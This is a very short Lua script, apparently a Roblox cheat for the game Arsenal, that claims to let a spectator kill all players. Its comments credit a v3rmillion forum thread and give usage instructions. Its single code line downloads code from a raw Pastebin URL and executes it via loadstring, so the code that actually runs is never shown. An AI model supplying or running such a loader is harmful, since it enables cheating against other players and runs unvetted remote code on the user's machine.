--// source: https://v3rmillion.net/showthread.php?tid=1035399
--// credits: Arsenal Kill All As Spectator by Prestiged.
--// BIG NOTE: you need to deploy once then you can afk as spectator or whatever you wanna do or else it won't work.

loadstring(game:HttpGet("https://pastebin.com/raw/0azVghz0", true))()